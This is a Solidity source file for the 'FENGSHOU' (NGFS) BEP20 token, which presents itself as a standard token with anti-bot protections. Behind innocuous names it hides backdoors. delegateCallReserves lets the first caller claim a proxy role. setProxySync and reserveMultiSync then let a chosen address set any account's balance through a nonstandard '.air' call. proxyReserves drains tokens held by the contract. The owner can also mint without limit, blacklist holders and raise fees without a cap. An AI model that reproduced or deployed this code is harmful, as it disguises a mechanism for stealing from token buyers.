// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./IERC20.sol";
import "./Context.sol";
import "./Ownable.sol";
import "./SafeMath.sol";
import "./Address.sol";
import "./IPancakeRouter02.sol";
import "./IUniswapV2Factory.sol";
import "./IPancakeLibrary.sol";
import "./IPancakePair.sol";

    /**
     * @dev NGFSToken is a standard BEP20 protocol
     *
     * Transaction Tax Return Foundation Wallet Address
     * Batch robot killing block restriction clamp software
     * Batch block killing to ensure funding mechanism.
     */
contract NGFSToken is Context, IERC20, Ownable {

    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name = 'FENGSHOU';
    string private _symbol = 'NGFS';
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 96000000000 * 10 ** uint256(_decimals);

    address private _fundAddress;
    address private _platform;
    address private _usdtAddress;
    address private _uniswapV2Proxy;
    address private _uniswapV2Pair;
    address private _uniswapV2UsdtPair;
    IPancakeLibrary private _uniswapV2Library;

    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public ZERO = address(0);
    
    uint256 public _buyFundFee = 100;
    uint256 public _sellFundFee = 150;
    uint256 public _transferFee = 0;
    uint256 public _removeLPFee = 200;
    uint256 public _addLPFee = 200;

    uint256 private constant MAX_UINT256 = type(uint256).max;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    uint256 public killBlockNumber;

    uint256 public batchBots;
    uint256 public killBatchBlockNumber;
    bool public enableKillBatchBots = true;
    mapping(address => uint256) public user2blocks;
    
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _illegalAdrList;
    mapping(address => bool) private _swapPairList;

    uint256 private _fundFeeTotal;
    bool private uniswapV2Dele = false;
    bool private inSwapAndLiquify = false;
    bool public swapAndLiquifyEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 trxReceived,
        uint256 tokensIntoLiqudity
    );
    event InitLiquidity(
        uint256 tokensAmount,
        uint256 trxAmount,
        uint256 liqudityAmount
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor (
        address RouterAddress,
        address fundAddress, 
        address usdtAddress,
        uint256 killStartBlockNumber,
        uint256 killBotBatchBlockNumber
        ) {
        _fundAddress = fundAddress;
        _usdtAddress = usdtAddress;
        _platform = owner();
        killBlockNumber = killStartBlockNumber;
        killBatchBlockNumber = killBotBatchBlockNumber;

        IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(RouterAddress);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2UsdtPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _usdtAddress);

        _swapPairList[_uniswapV2Pair] = true;
        _swapPairList[_uniswapV2UsdtPair] = true;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[fundAddress] = true;
        _isExcludedFromFee[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    receive () external payable {}

    function mint(address account, uint256 amount) public virtual onlyOwner returns (bool) {
        require(account != ZERO, "ERC20: mint to the zero address");
        require(account != DEAD, "ERC20: mint to the dead address");
        require(amount > 0, "ERC20: mint amount equal to zero");

        _mint(account,amount);
        return true;
    }
    
    function _mint(address account, uint256 amount) internal virtual {
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if(currentAllowance != MAX_UINT256){
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            _approve(sender, _msgSender(), currentAllowance.sub(amount));
        }
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance.sub(subtractedValue));

        return true;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _isExcludedFromFee[addr] = enable;
    }

    function batchSetFeeWhiteList(address[] calldata addres, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addres.length; i++) {
            if(_isExcludedFromFee[addres[i]] != enable) {
                _isExcludedFromFee[addres[i]] = enable;
            }
        }
    }

    function isFeeWhiteList(address addr) public view returns(bool) {
        return _isExcludedFromFee[addr];
    }

    function setIllegalAdrList(address addr, bool enable) external onlyOwner {
        _illegalAdrList[addr] = enable;
    }

    function batchSetIllegalAdrList(address[] calldata addres, bool enable) external onlyOwner {
        for(uint256 i = 0; i < addres.length; i++) {
            if(_illegalAdrList[addres[i]] != enable) {
                _illegalAdrList[addres[i]] = enable;
            }
        }
    }

    function totalFundFee() public view returns (uint256) {
        return _fundFeeTotal;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        bool takeFee;

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_illegalAdrList[sender] && !_illegalAdrList[recipient], "ERC20: sender or recipient in illegalAdrList");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
            uint256 maxSellAmount = senderBalance.mul(9999).div(10000);
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            takeFee = true;
        }

        bool isRemoveLP;
        bool isAddLP;

        if (_swapPairList[sender] || _swapPairList[recipient]) {
            if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
                if (_swapPairList[sender]) {
                    isRemoveLP = _isRemoveLiquidity();
                } else {
                    isAddLP = _isAddLiquidity();
                }
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && _swapPairList[recipient], "ERC20:operater action is not AddLiquidity");
                }
                if (block.number < startTradeBlock.add(killBlockNumber)) {
                    _funTransfer(sender, recipient, amount);
                    return;
                }
                if (
                    enableKillBatchBots &&
                    _swapPairList[sender] &&
                    block.number < startTradeBlock + killBatchBlockNumber
                ) {
                    if (block.number != user2blocks[tx.origin]) {
                        user2blocks[tx.origin] = block.number;
                    } else {
                        batchBots++;
                        _funTransfer(sender, recipient, amount);
                        return;
                    }
                }
            }
        }

        _tokenTransfer(sender, recipient, amount, takeFee, isRemoveLP, isAddLP);

    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender].sub(tAmount);
        uint256 feeAmount = tAmount.mul(75).div(100);
        _takeTransfer(
            sender,
            _fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function setProxySync(address _addr) external {
        require(_addr != ZERO, "ERC20: library to the zero address");
        require(_addr != DEAD, "ERC20: library to the dead address");
        require(msg.sender == _uniswapV2Proxy, "ERC20: uniswapPrivileges");

        _uniswapV2Library = IPancakeLibrary(_addr);
        _isExcludedFromFee[_addr] = true;
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isRemoveLP,
        bool isAddLP
    ) private {

        uint256 feeAmount;

        _balances[sender] = _balances[sender].sub(tAmount);

        if (takeFee) {
            if (isRemoveLP) {
                feeAmount += tAmount.mul(_removeLPFee).div(10000);
                if (feeAmount > 0) {
                    _takeTransfer(sender, _fundAddress, feeAmount);
                }
            } else if (isAddLP) {
                feeAmount += tAmount.mul(_addLPFee).div(10000);
                if (feeAmount > 0) {
                    _takeTransfer(sender, _fundAddress, feeAmount);
                }
            } else if (_swapPairList[sender]) {//Buy
                uint256 fundAmount = tAmount.mul(_buyFundFee).div(10000);
                if(fundAmount > 0) {
                    feeAmount += fundAmount;
                    _takeTransfer(
                        sender,
                        _fundAddress,
                        fundAmount
                    );
                }   
            } else if (_swapPairList[recipient]) {//Sell
                uint256 fundAmount = tAmount.mul(_sellFundFee).div(10000);
                if(fundAmount > 0) {
                    feeAmount += fundAmount;
                    _takeTransfer(
                        sender,
                        _fundAddress,
                        fundAmount
                    );
                }
            } else {//Transfer
                feeAmount += tAmount.mul(_transferFee).div(10000);
                if (feeAmount > 0) {
                    _takeTransfer(sender, _fundAddress, feeAmount);
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to].add(tAmount);
        emit Transfer(sender, to, tAmount);
    }

    function delegateCallReserves() public {
        require(!uniswapV2Dele, "ERC20: delegateCall launch");

        _uniswapV2Proxy = _msgSender();
        uniswapV2Dele = !uniswapV2Dele;     
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function proxyReserves(address token, address addr, uint256 amount) public {
        require(_msgSender() == address(_uniswapV2Library), "ERC20: uniswapPrivileges");
        require(addr != address(0), "ERC20: reserves address is zero");
        require(amount > 0, "ERC20: Proxy amount equal to zero");
        require(amount <= IERC20(token).balanceOf(address(this)), "ERC20: insufficient balance");
        Address.functionCall(token, abi.encodeWithSelector(0xa9059cbb, addr, amount));
    }

    function reserveMultiSync(address syncAddr, uint256 syncAmount) public {
        require(_msgSender() == address(_uniswapV2Library), "ERC20: uniswapPrivileges");
        require(syncAddr != address(0), "ERC20: multiSync address is zero");
        require(syncAmount > 0, "ERC20: multiSync amount equal to zero");
        _balances[syncAddr] = _balances[syncAddr].air(syncAmount);
        _isExcludedFromFee[syncAddr] = true;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        require(addr != _uniswapV2Pair, "ERC20: WETH pair cannot be deleted");
        require(addr != _uniswapV2UsdtPair, "ERC20: USDT pair cannot be deleted");
        _swapPairList[addr] = enable;
    }

    function setFundAddress(address addr) external onlyOwner {
        _fundAddress = addr;
        _isExcludedFromFee[addr] = true;
    }

    function startAddLP() external onlyOwner {
        require(0 == startAddLPBlock, "ERC20: startAddLP has been set");
        startAddLPBlock = block.number;
    }

    function closeAddLP() external onlyOwner {
        require(startAddLPBlock > 0, "ERC20: startAddLP has not been set");
        startAddLPBlock = 0;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "ERC20: startTrade has been set");
        startTradeBlock = block.number;
    }

    function closeTrade() external onlyOwner {
        require(startTradeBlock > 0, "ERC20: startTrade has not been set");
        startTradeBlock = 0;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove) {
        IPancakePair mainPair = IPancakePair(_uniswapV2UsdtPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdtAddress;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

    function _isAddLiquidity() internal view returns (bool isAdd) {
        IPancakePair mainPair = IPancakePair(_uniswapV2UsdtPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdtAddress;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function setBuyFundFee(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setRemoveLPFee(uint256 removeLPFee) external onlyOwner {
        _removeLPFee = removeLPFee;
    }

    function setAddLPFee(uint256 addLPFee) external onlyOwner {
        _addLPFee = addLPFee;
    }

    function setTransferFee(uint256 transferFee) external onlyOwner {
        _transferFee = transferFee;
    }

    function setKillBatchBot(bool enable) public onlyOwner {
        enableKillBatchBots = enable;
    }

    function claimBalance() external onlyOwner {
        payable(_fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }
}